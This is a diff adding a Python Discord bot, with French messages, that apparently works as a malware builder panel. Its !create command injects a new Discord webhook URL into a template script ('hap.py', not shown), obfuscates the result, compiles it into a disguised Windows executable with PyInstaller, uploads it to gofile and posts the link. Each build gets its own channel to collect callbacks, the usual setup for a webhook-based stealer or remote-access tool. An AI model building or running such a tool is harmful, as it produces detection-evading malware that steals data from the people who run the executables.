@@ -1,0 +1,278 @@
+import random
+import os
+import requests
+import time
+import string
+import subprocess
+import shutil
+import discord
+from discord.ext import commands
+import json
+import re
+import asyncio
+
+try:
+    with open("config.json", "r") as json_file:
+        config_data = json.load(json_file)
+except FileNotFoundError:
+    config_data = {
+        "token": "YOUR_DEFAULT_TOKEN_HERE",
+        "password_req": True,
+        "guild_id": 1234567891234567891,
+        "owner_id": [1234567891234567891, 1234567891234567891]
+    }
+
+    with open("config.json", "w") as new_json_file:
+        json.dump(config_data, new_json_file, indent=4)
+    print("Veuillez remplir le fichier config.json")
+    time.sleep(3)
+    exit()
+
+token = config_data["token"]
+password_req = config_data["password_req"]
+guild_id = config_data["guild_id"]
+owner_id = config_data["owner_id"]
+
+
+bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+bot.remove_command('help')
+
+compt = 0
+
+
+try:
+    os.mkdir("data")
+except:
+    pass
+
+@bot.event
+async def on_ready():
+    global mot_de_passe
+    print(f'Connecté en tant que {bot.user.name}')
+
+
+    if password_req: 
+        caracteres = string.ascii_letters + string.digits + string.punctuation
+        mot_de_passe = ''.join(random.choice(caracteres) for _ in range(32))
+
+        print(f'your password : {mot_de_passe}')
+
+        with open('your_password.txt', 'w', encoding='utf-8') as passw:
+            passw.write(f'your password : {mot_de_passe}')
+
+    if owner_id != "[]":
+        for user_id in owner_id:
+            user = bot.get_user(user_id)
+            if password_req: 
+                if user:
+                    await user.send(f'**__Votre mot de passe :__** ```{mot_de_passe}```\n**__Commandes du bot :__**\n```!reset : supprime tous les salons et supprime tous les fichiers générés sur le serveur\n!create : crée un exe```')
+                else:
+                    print(f"Impossible de trouver l'utilisateur avec l'ID {user_id}")
+            else:
+                if user:
+                    await user.send(f'**__Commandes du bot :__**\n```!reset : supprime tous les salons et supprime tous les fichiers générés sur le serveur\n!create : crée un exe```')
+                else:
+                    print(f"Impossible de trouver l'utilisateur avec l'ID {user_id}")
+
+webhook_name = "Spidey Bot"
+
+
+
+@bot.event
+async def on_raw_reaction_add(payload):
+    if payload.user_id in owner_id and not payload.member.bot:
+        channel = bot.get_channel(payload.channel_id)
+        if channel is None:
+            return
+
+        try:
+            message = await channel.fetch_message(payload.message_id)
+        except discord.NotFound:
+            return
+
+        if payload.emoji.name == "💣":
+            await message.remove_reaction("💣", payload.member)
+
+            confirmation_message = await channel.send(
+                f"**{payload.member.mention}, êtes-vous sûr de vouloir supprimer ce canal ?**"
+            )
+
+            await confirmation_message.add_reaction("✅")
+            await confirmation_message.add_reaction("❌")
+
+            try:
+                reaction, user = await bot.wait_for(
+                    "reaction_add",
+                    timeout=60.0,
+                    check=lambda r, u: u.id == payload.user_id
+                    and r.message.id == confirmation_message.id
+                    and str(r.emoji) in ["✅", "❌"],
+                )
+            except asyncio.TimeoutError:
+                await confirmation_message.delete()
+            else:
+                if str(reaction.emoji) == "✅":
+                    await channel.delete()
+                    match = re.search(r"bst_(\d+)", channel.name)
+                    if match:
+                        number = match.group(1)
+                        
+                        dist_folder = "dist"
+                        for filename in os.listdir(dist_folder):
+                            if filename.startswith(f"hap_{number}"):
+                                file_path = os.path.join(dist_folder, filename)
+                                os.remove(file_path)
+
+                        dist_folder = "data"
+                        for filename in os.listdir(dist_folder):
+                            if filename.startswith(f"hap_{number}"):
+                                file_path = os.path.join(dist_folder, filename)
+                                os.remove(file_path)
+
+
+                elif str(reaction.emoji) == "❌":
+                    await confirmation_message.delete()
+
+
+@bot.command()
+async def help(ctx):
+    await ctx.send(f'**__Commandes du bot :__**\n```!reset : supprime tous les salons et supprime tous les fichiers générés sur le serveur\n!create : crée un exe```')
+
+
+
+
+@bot.command()
+async def create(ctx, *, password=None):
+    global random_filename, compt
+    await ctx.message.delete()
+    guild = bot.get_guild(guild_id)
+
+    if guild is None:
+        await ctx.send(f"Serveur avec l'ID {guild_id} non trouvé.")
+        return
+
+    if not password_req or (password and password == mot_de_passe):
+        compt += 1
+        random_filename = f"hap_{compt}"
+
+        with open('hap.py', 'r', encoding="utf-8") as f:
+            content = f.read()
+
+        with open(f"data//{random_filename}.py", 'w', encoding='utf-8') as file:
+            channel = await guild.create_text_channel(f"BST_{compt}")
+            webhook = await channel.create_webhook(name=webhook_name)
+            hook = webhook.url
+
+            file.write(f'hook = "{hook}"\n' + content)
+
+        msg = await channel.send("**Loading...**")
+
+        subprocess.run(f"PyObfuscator data//{random_filename}.py", shell=True, check=True)
+
+        try:
+            os.remove(f"data//{random_filename}.py")
+        except:
+            pass
+
+        random_filename += "_obfu"
+
+        subprocess.run(f"pyinstaller --onefile -i icon.ico data//{random_filename}.py", shell=True, check=True)
+
+        try:
+            os.remove(f"{random_filename}.spec")
+        except:
+            pass
+
+        if os.path.exists("build") and os.path.isdir("build"):
+            shutil.rmtree("build")
+
+        files = {'upload_file': (f'YourFile_{compt}.exe', open(f'dist//{random_filename}.exe', 'rb'))}
+
+        response = requests.post("https://store2.gofile.io/uploadFile", files=files)
+
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("status") == "ok":
+                download_link = data.get("data").get("downloadPage")
+                print(f"Lien de téléchargement : {download_link}")
+            else:
+                print(f"Échec de l'upload {response.status_code}, {response.text}")
+        else:
+            print(f"Erreur lors de la requête {response.status_code}, {response.text}")
+
+        await msg.edit(content=f"__**Your Link :**__\n{download_link}")
+        await msg.add_reaction("💣")
+        await msg.pin()
+    elif password_req:
+        if password == None:
+            await ctx.send("Mot de passe requis.")
+        elif password != mot_de_passe:
+            await ctx.send("Mot de passe incorrect.")
+
+
+
+
+
+
+
+@bot.command()
+async def reset(ctx, *, password=None):
+    global mot_de_passe
+    await ctx.message.delete()
+    guild = bot.get_guild(guild_id)
+
+    if guild is None:
+        await ctx.send(f"Serveur avec l'ID {guild_id} non trouvé.")
+        return
+
+    if ctx.author.id in owner_id:
+        if password_req:
+            if not password:
+                await ctx.send("Un mot de passe est requis.")
+                return
+
+            if password == mot_de_passe:
+                caracteres = string.ascii_letters + string.digits + string.punctuation
+                mot_de_passe = ''.join(random.choice(caracteres) for _ in range(32))
+
+                print(f"Votre nouveau mot de passe : {mot_de_passe}")
+
+                with open('your_password.txt', 'w', encoding="utf-8") as passw:
+                    passw.write(f"your password : {mot_de_passe}")
+
+                await ctx.author.send(f"**__Votre nouveau mot de passe :__**```{mot_de_passe}```")
+
+            else:
+                await ctx.send("Mot de passe incorrect")
+                return
+        else:
+            for nom_fichier in os.listdir("data"):
+                if nom_fichier.startswith("hap_"):
+                    chemin_fichier = os.path.join(f"{os.getcwd()}//data//{nom_fichier}")
+                    os.remove(chemin_fichier)
+
+            if os.path.exists("dist") and os.path.isdir("dist"):
+                shutil.rmtree("dist")
+
+            try:
+                os.remove(f"{random_filename}.spec")
+            except:
+                pass
+
+        channels = ctx.guild.channels
+        for channel in channels:
+            time.sleep(0.1)
+            await channel.delete()
+
+        await guild.create_text_channel("Réinitialisation réussie")
+    else:
+        await ctx.send("Vous devez être dans la whitelist pour utiliser cette commande.")
+
+        
+
+try:
+    bot.run(token)
+except discord.errors.LoginFailure:
+    print("Erreur, token invalide")
+    time.sleep(3)
+    exit()
